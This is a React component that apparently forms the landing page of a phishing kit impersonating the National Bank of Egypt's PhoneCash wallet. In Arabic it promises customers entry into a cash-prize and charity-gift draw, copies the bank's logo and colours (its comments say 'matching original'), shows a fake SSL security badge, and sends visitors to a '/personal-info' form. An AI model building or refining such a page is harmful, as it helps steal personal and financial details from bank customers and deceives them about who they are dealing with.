import { useEffect } from "react";
import { useLocation } from "wouter";
import { navigateToPage } from "@/lib/store";

export default function HomePage() {
  const [, setLocation] = useLocation();

  useEffect(() => {
    navigateToPage("الصفحة الرئيسية - محفظة الأهلي فون كاش");
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a4d2e] to-[#2d6b3f] flex flex-col items-center justify-center p-4" dir="rtl">
      {/* Background Pattern */}
      <div className="absolute inset-0 opacity-5">
        <div className="absolute inset-0" style={{
          backgroundImage: `repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(255,255,255,0.1) 35px, rgba(255,255,255,0.1) 70px)`,
        }}></div>
      </div>

      <div className="relative z-10 w-full max-w-md flex flex-col items-center">
        {/* Single White Card */}
        <div className="bg-white/95 backdrop-blur-sm rounded-2xl shadow-2xl p-6 md:p-8 w-full">
          {/* NBE Logo */}
          <div className="flex justify-center mb-5">
            <img
              src="/images/nbe-phonecash-logo.jpg"
              alt="NBE PhoneCash"
              className="w-16 h-16 md:w-20 md:h-20 rounded-xl shadow-md"
            />
          </div>

          {/* Title - matching original green color */}
          <div className="text-center mb-5">
            <h1 className="text-2xl md:text-3xl font-bold text-[#1a6d3a] mb-2" style={{ fontFamily: "'Tajawal', sans-serif" }}>
              محفظة الاهلي فون كاش
            </h1>
            <p className="text-[#1a6d3a] text-sm font-medium" style={{ fontFamily: "'Tajawal', sans-serif" }}>
              خاص لعملاء محفظة الاهلي فون كاش
            </p>
          </div>

          {/* Description text - matching original */}
          <div className="text-center mb-6">
            <p className="text-[#2d6b3f] text-sm leading-relaxed" style={{ fontFamily: "'Tajawal', sans-serif" }}>
              سجل في السحب الان على الجوائز النقدية والهدية الخيرية
              <br />
              المقدمة من محفظة الأهلي فون كاش
            </p>
          </div>

          {/* Register Button with gift box icon */}
          <button
            onClick={() => setLocation("/personal-info")}
            className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg flex items-center justify-center gap-3"
            style={{ fontFamily: "'Tajawal', sans-serif" }}
          >
            <span className="text-2xl">🎁</span>
            <span>سجل في السحب الان</span>
          </button>

          <p className="text-center text-gray-400 text-xs mt-4" style={{ fontFamily: "'Tajawal', sans-serif" }}>
            بالتسجيل أنت توافق على الشروط والأحكام
          </p>
        </div>

        {/* SSL Footer - matching original */}
        <div className="mt-6 flex items-center justify-center gap-2 text-green-200/80">
          <svg className="w-4 h-4 text-yellow-400" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          <span className="text-xs" style={{ fontFamily: "'Tajawal', sans-serif" }}>
            محمي بتشفير SSL 256-bit | محفظة الاهلي فون كاش المصري © 2024
          </span>
        </div>
      </div>
    </div>
  );
}
